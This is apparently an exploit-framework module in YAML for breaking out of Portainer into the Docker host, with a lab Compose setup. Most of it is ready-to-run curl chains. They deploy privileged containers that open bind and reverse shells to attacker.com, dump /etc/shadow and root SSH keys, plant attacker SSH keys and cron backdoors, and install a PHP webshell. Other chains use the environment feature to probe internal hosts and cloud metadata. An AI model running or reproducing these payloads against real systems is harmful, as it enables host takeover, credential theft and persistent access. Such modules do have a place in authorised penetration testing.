---
comment: "Portainer is a Docker/Kubernetes management UI. Authenticated users can\
  \ create and manage\ncontainers via the REST API or the Stacks (Docker Compose)\
  \ feature. Because Portainer is\nconnected to the Docker socket, any user who can\
  \ create containers can escape to the Docker\nhost by deploying a privileged container\
  \ with the host filesystem bind-mounted at /host and\nrunning chroot /host to obtain\
  \ a root shell on the underlying OS.\n\nCVE-2021-25437 (CVSS 8.8): Authenticated\
  \ RCE in Portainer < 1.25.0. The container creation\nendpoint /api/endpoints/<id>/docker/containers/create\
  \ accepts a privileged container definition\nthat executes arbitrary commands on\
  \ the Docker host via chroot into the bind-mounted root\nfilesystem.\n\nThe core\
  \ insight: Portainer socket access equals full host compromise \u2014 Docker socket\
  \ =\nunrestricted root on the host, regardless of any Portainer RBAC settings.\n"
docker:
  compose: "services:\n  portainer:\n    image: portainer/portainer-ce:2.19.0\n  \
    \  ports:\n      - \"9443:9443\"\n      - \"9000:9000\"\n    volumes:\n      -\
    \ /var/run/docker.sock:/var/run/docker.sock\n      - portainer_data:/data\nvolumes:\n\
    \  portainer_data:\n"
  note: "Starts Portainer CE 2.19.0 connected to the local Docker socket.\nAccess\
    \ at http://localhost:9000 (HTTP) or https://localhost:9443 (HTTPS).\nOn first\
    \ run, create an admin account through the setup wizard.\nThe test environment\
    \ IS Portainer \u2014 demonstrate the privileged container escape by\ncreating\
    \ a container via the UI under Containers > Add container, enabling Privileged\n\
    mode and adding the bind mount /:/host under Volumes > map additional volume.\n"
functions:
  bind-shell:
  - code: |
      TOKEN=$(curl -s -X POST http://portainer.local:9000/api/auth \
        -H "Content-Type: application/json" \
        -d '{"username":"admin","password":"adminpassword"}' | jq -r .jwt)

      CONTAINER=$(curl -s -X POST \
        "http://portainer.local:9000/api/endpoints/1/docker/containers/create" \
        -H "Authorization: Bearer $TOKEN" \
        -H "Content-Type: application/json" \
        -d '{
          "Image": "alpine",
          "Cmd": ["/bin/sh", "-c",
            "nc -lvp 4444 -e /bin/sh"],
          "HostConfig": {
            "Binds": ["/:/host"],
            "Privileged": true,
            "NetworkMode": "host",
            "PortBindings": {"4444/tcp": [{"HostPort": "4444"}]}
          },
          "ExposedPorts": {"4444/tcp": {}}
        }' | jq -r .Id)

      curl -s -X POST \
        "http://portainer.local:9000/api/endpoints/1/docker/containers/$CONTAINER/start" \
        -H "Authorization: Bearer $TOKEN"
    comment: |
      Deploys a privileged container in host network mode that listens on TCP port 4444 for
      an incoming shell connection. Because NetworkMode is host, the port is exposed directly
      on the Docker host's network interface without a separate port mapping step.
      Connect from the attacker with: nc victim.com 4444
      After connecting, run chroot /host /bin/sh to escape to the host OS.
    connector: tcp-client
    contexts:
      authenticated:
    platform: linux
    tty: false
  file-read:
  - code: |
      TOKEN=$(curl -s -X POST http://portainer.local:9000/api/auth \
        -H "Content-Type: application/json" \
        -d '{"username":"admin","password":"adminpassword"}' | jq -r .jwt)

      # Create a container that reads sensitive host files via the /host bind mount
      CONTAINER=$(curl -s -X POST \
        "http://portainer.local:9000/api/endpoints/1/docker/containers/create" \
        -H "Authorization: Bearer $TOKEN" \
        -H "Content-Type: application/json" \
        -d '{
          "Image": "alpine",
          "Cmd": ["/bin/sh", "-c",
            "echo === /etc/shadow === && cat /host/etc/shadow && echo === /root/.ssh/id_rsa === && cat /host/root/.ssh/id_rsa 2>/dev/null || echo no key"],
          "HostConfig": {
            "Binds": ["/:/host"],
            "Privileged": true
          }
        }' | jq -r .Id)

      curl -s -X POST \
        "http://portainer.local:9000/api/endpoints/1/docker/containers/$CONTAINER/start" \
        -H "Authorization: Bearer $TOKEN"

      # Retrieve file contents from container logs
      curl -s \
        "http://portainer.local:9000/api/endpoints/1/docker/containers/$CONTAINER/logs?stdout=1&stderr=1" \
        -H "Authorization: Bearer $TOKEN"
    comment: |
      Reads arbitrary files from the Docker host via the privileged container's /host bind mount.
      The container process runs as root inside the container (privileged mode bypasses all
      namespace restrictions), so /host/etc/shadow, /host/root/.ssh/id_rsa, and any other
      host file readable by root are accessible. Output is retrieved from container logs.

      Common targets:
      - /host/etc/shadow: password hashes
      - /host/root/.ssh/id_rsa: root SSH private key
      - /host/etc/docker/daemon.json: Docker daemon configuration
      - /host/var/lib/docker/volumes/: named volume contents
    contexts:
      authenticated:
    platform: linux
  file-write:
  - code: |
      TOKEN=$(curl -s -X POST http://portainer.local:9000/api/auth \
        -H "Content-Type: application/json" \
        -d '{"username":"admin","password":"adminpassword"}' | jq -r .jwt)

      # Write an SSH authorized_keys entry to the host root account
      CONTAINER=$(curl -s -X POST \
        "http://portainer.local:9000/api/endpoints/1/docker/containers/create" \
        -H "Authorization: Bearer $TOKEN" \
        -H "Content-Type: application/json" \
        -d '{
          "Image": "alpine",
          "Cmd": ["/bin/sh", "-c",
            "mkdir -p /host/root/.ssh && chmod 700 /host/root/.ssh && echo \"ssh-ed25519 AAAA...attacker_pubkey... attacker\" >> /host/root/.ssh/authorized_keys && chmod 600 /host/root/.ssh/authorized_keys"],
          "HostConfig": {
            "Binds": ["/:/host"],
            "Privileged": true
          }
        }' | jq -r .Id)

      curl -s -X POST \
        "http://portainer.local:9000/api/endpoints/1/docker/containers/$CONTAINER/start" \
        -H "Authorization: Bearer $TOKEN"

      # Alternative: plant a cron job for persistent code execution
      # "Cmd": ["/bin/sh", "-c",
      #   "echo '* * * * * root bash -i >& /dev/tcp/attacker.com/12345 0>&1' > /host/etc/cron.d/backdoor && chmod 644 /host/etc/cron.d/backdoor"]
    comment: |
      Writes arbitrary files to the Docker host filesystem via the privileged container's
      /host bind mount. The container runs as root in privileged mode, bypassing all
      filesystem permission checks on the host.

      Common write targets for persistence:
      - /host/root/.ssh/authorized_keys: grants SSH access as root
      - /host/etc/cron.d/backdoor: executes commands on a cron schedule
      - /host/etc/sudoers.d/backdoor: grants passwordless sudo to an existing user
      - /host/usr/local/bin/<cmd>: replaces a host binary with a backdoored version
    contexts:
      authenticated:
    platform: linux
  rce:
  - code: |
      # Step 1: authenticate and obtain a JWT token
      TOKEN=$(curl -s -X POST http://portainer.local:9000/api/auth \
        -H "Content-Type: application/json" \
        -d '{"username":"admin","password":"adminpassword"}' | jq -r .jwt)

      # Step 2: create a privileged container with host root bind-mounted at /host
      CONTAINER=$(curl -s -X POST \
        "http://portainer.local:9000/api/endpoints/1/docker/containers/create" \
        -H "Authorization: Bearer $TOKEN" \
        -H "Content-Type: application/json" \
        -d '{
          "Image": "alpine",
          "Cmd": ["chroot", "/host", "/bin/sh", "-c", "id; hostname; cat /etc/shadow"],
          "HostConfig": {
            "Binds": ["/:/host"],
            "Privileged": true,
            "NetworkMode": "host"
          }
        }' | jq -r .Id)

      # Step 3: start the container
      curl -s -X POST \
        "http://portainer.local:9000/api/endpoints/1/docker/containers/$CONTAINER/start" \
        -H "Authorization: Bearer $TOKEN"

      # Step 4: retrieve output via logs
      curl -s \
        "http://portainer.local:9000/api/endpoints/1/docker/containers/$CONTAINER/logs?stdout=1&stderr=1" \
        -H "Authorization: Bearer $TOKEN"
    comment: |
      Creates a privileged Docker container with the host root filesystem bind-mounted at /host,
      then uses chroot /host to break out of the container namespace and execute commands as root
      on the Docker host. The host bind mount gives unrestricted access to the entire host OS.

      Portainer's Stacks (Compose) feature can be used as an alternative: deploy a stack with a
      privileged service definition. Navigate to Stacks > Add stack, paste a Compose definition
      with privileged: true and a /:/host volume, then exec into the container.

      Requires authenticated access to Portainer with container creation privileges.
      CVE-2021-25437 affects Portainer < 1.25.0 specifically, but the privileged container
      escape is an inherent design consequence of Docker socket exposure on all versions.
    contexts:
      authenticated:
    platform: linux
  reverse-shell:
  - blind: true
    code: |
      TOKEN=$(curl -s -X POST http://portainer.local:9000/api/auth \
        -H "Content-Type: application/json" \
        -d '{"username":"admin","password":"adminpassword"}' | jq -r .jwt)

      CONTAINER=$(curl -s -X POST \
        "http://portainer.local:9000/api/endpoints/1/docker/containers/create" \
        -H "Authorization: Bearer $TOKEN" \
        -H "Content-Type: application/json" \
        -d '{
          "Image": "alpine",
          "Cmd": ["/bin/sh", "-c",
            "apk add -q bash && bash -i >& /dev/tcp/attacker.com/12345 0>&1"],
          "HostConfig": {
            "Binds": ["/:/host"],
            "Privileged": true,
            "NetworkMode": "host"
          }
        }' | jq -r .Id)

      curl -s -X POST \
        "http://portainer.local:9000/api/endpoints/1/docker/containers/$CONTAINER/start" \
        -H "Authorization: Bearer $TOKEN"
    comment: |
      Deploys a privileged container that issues a bash reverse shell to attacker.com:12345.
      The container runs on the host network (NetworkMode: host) so the outbound TCP connection
      originates from the Docker host's IP. The /:/host bind mount is included so post-connection
      commands can chroot /host to interact with the full host OS.
      The start request returns immediately; the reverse shell connects asynchronously.
    contexts:
      authenticated:
    listener: tcp-server
    platform: linux
    tty: false
  ssrf:
  - code: "TOKEN=$(curl -s -X POST http://portainer.local:9000/api/auth \\\n  -H \"\
      Content-Type: application/json\" \\\n  -d '{\"username\":\"admin\",\"password\"\
      :\"adminpassword\"}' | jq -r .jwt)\n\n# Add a new Docker environment pointing\
      \ to an internal TCP Docker socket or service.\n# Portainer will attempt to\
      \ connect to the supplied URL immediately on endpoint creation.\ncurl -s -X\
      \ POST \"http://portainer.local:9000/api/endpoints\" \\\n  -H \"Authorization:\
      \ Bearer $TOKEN\" \\\n  -H \"Content-Type: multipart/form-data\" \\\n  -F \"\
      Name=internal-probe\" \\\n  -F \"EndpointCreationType=1\" \\\n  -F \"URL=tcp://192.168.1.100:2375\"\
      \n\n# Probe an internal Docker daemon (unauthenticated TCP socket \u2014 common\
      \ misconfiguration)\ncurl -s -X POST \"http://portainer.local:9000/api/endpoints\"\
      \ \\\n  -H \"Authorization: Bearer $TOKEN\" \\\n  -H \"Content-Type: multipart/form-data\"\
      \ \\\n  -F \"Name=internal-docker\" \\\n  -F \"EndpointCreationType=1\" \\\n\
      \  -F \"URL=tcp://10.0.0.5:2375\"\n\n# Portainer also supports probing AWS/GCP\
      \ metadata via the environment URL field:\n# URL=http://169.254.169.254/latest/meta-data/iam/security-credentials/\n"
    comment: |
      Portainer's "Add Environment" feature (Environments > Add environment > Docker Standalone)
      accepts a TCP or HTTP URL and immediately attempts to connect to it when saving.
      Supplying an internal IP/port causes Portainer to probe the internal network from the
      server side, enabling port scanning and service detection via response timing/errors.

      If an internal unauthenticated Docker TCP socket (port 2375) is found, Portainer will
      register it as a managed environment, giving the attacker full control over that Docker
      host through the Portainer UI.

      Requires admin or environment management privileges in Portainer.
      CVE-2022-25356 (CSRF) can be chained with this vector to trigger the request without
      direct authentication from a victim admin's browser session.
    contexts:
      admin:
      authenticated:
  webshell:
  - code: |
      TOKEN=$(curl -s -X POST http://portainer.local:9000/api/auth \
        -H "Content-Type: application/json" \
        -d '{"username":"admin","password":"adminpassword"}' | jq -r .jwt)

      CONTAINER=$(curl -s -X POST \
        "http://portainer.local:9000/api/endpoints/1/docker/containers/create" \
        -H "Authorization: Bearer $TOKEN" \
        -H "Content-Type: application/json" \
        -d '{
          "Image": "php:8-apache",
          "Cmd": ["/bin/bash", "-c",
            "echo '\''<?php if(isset($_REQUEST[\"c\"])){system($_REQUEST[\"c\"]);}?>'\'' > /var/www/html/shell.php && apache2-foreground"],
          "HostConfig": {
            "Binds": ["/:/host"],
            "Privileged": true,
            "PortBindings": {"80/tcp": [{"HostPort": "8888"}]}
          },
          "ExposedPorts": {"80/tcp": {}}
        }' | jq -r .Id)

      curl -s -X POST \
        "http://portainer.local:9000/api/endpoints/1/docker/containers/$CONTAINER/start" \
        -H "Authorization: Bearer $TOKEN"

      # Access the webshell at: http://victim.com:8888/shell.php?c=chroot+/host+id
    comment: |
      Deploys a PHP/Apache container with a webshell written to /var/www/html/shell.php on
      container start. The container has the host root bind-mounted at /host and runs in
      privileged mode. The webshell is accessible at http://victim.com:8888/shell.php.
      Use the c parameter with chroot /host <cmd> to execute commands on the Docker host.
      Example: ?c=chroot+/host+cat+/etc/shadow
    contexts:
      authenticated:
...
